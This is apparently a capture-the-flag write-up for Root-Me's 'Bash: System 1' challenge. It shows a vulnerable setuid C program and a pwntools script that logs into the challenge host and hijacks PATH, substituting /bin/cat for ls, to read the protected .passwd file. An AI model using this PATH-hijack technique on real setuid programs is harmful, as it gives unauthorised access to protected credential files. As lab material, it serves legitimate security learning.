# Bash: System 1

## Statement

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

## Exploit 

```python
from pwn import *

s = ssh(host='challenge02.root-me.org' , user='app-script-ch11', password='app-script-ch11', port=2222)
log.success("SSH connection established.")
p = s.shell()

p.sendline(b"cp /bin/cat /tmp/ls")
p.sendline(b"PATH=/tmp:$PATH ./ch11")
p.interactive()
```
